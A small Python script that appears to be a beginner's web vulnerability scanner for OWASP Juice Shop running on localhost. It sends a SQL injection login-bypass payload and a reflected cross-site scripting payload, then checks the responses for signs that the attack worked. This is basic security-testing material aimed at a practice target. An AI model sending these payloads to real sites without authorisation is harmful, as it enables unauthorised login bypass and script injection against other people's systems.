import requests

# Function to check for SQL Injection
def check_sql_injection(url):
    print("\n--- Running SQL Injection Check ---")
    
    # Define a simple SQL injection payload
    payload = "' OR 1=1 --"
    
    # Construct the URL for the simulated login test
    test_url = f"{url}/users/login?username={payload}&password=test" 
    
    try:
        response = requests.get(test_url, timeout=5)
        
        # Check for typical success indicators
        if response.status_code == 200 and ("Welcome" in response.text or "Signed in" in response.text):
            print("!!! VULNERABILITY FOUND: SQL Injection may be possible with payload: " + payload)
        else:
            print("SQL Injection check passed (no simple bypass detected).")
            
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection check: {e}")

# Function to check for Cross-Site Scripting (XSS)
def check_xss(url):
    print("\n--- Running XSS Check ---")
    
    # Define a simple non-persistent XSS payload
    payload = "<script>alert('XSS-Test')</script>"
    
    # Construct a URL to test for reflected XSS
    test_url = f"{url}/search?q={payload}"  # Testing an endpoint that reflects user input
    
    try:
        response = requests.get(test_url, timeout=5)
        
        # Check if the payload is reflected directly in the response body
        if payload in response.text:
            print("!!! VULNERABILITY FOUND: Possible Reflected XSS detected!")
            print("Reflected Payload: " + payload)
        else:
            print("XSS check passed (payload not directly reflected).")
            
    except requests.exceptions.RequestException as e:
        print(f"Error during XSS check: {e}")

# Main scanner function
def run_scanner(url):
    print(f"Starting scan for {url}")
    
    # 1. Send a basic GET request
    print(f"Testing URL: {url}")
    try:
        response = requests.get(url, timeout=5)
        print(f"Status Code: {response.status_code}")
        
        if "OWASP Juice Shop" in response.text:
            print("Target identified as Juice Shop.")
            
            # --- VULNERABILITY CHECKS ---
            check_sql_injection(url)  # Existing call
            check_xss(url)            # <<< NEW XSS CHECK CALL
            # ---------------------------
            
    except requests.exceptions.RequestException as e:
        print(f"Error accessing URL: {e}")

# Execution block remains the same
if __name__ == "__main__":
    target_url = "http://127.0.0.1:3000" 
    run_scanner(target_url)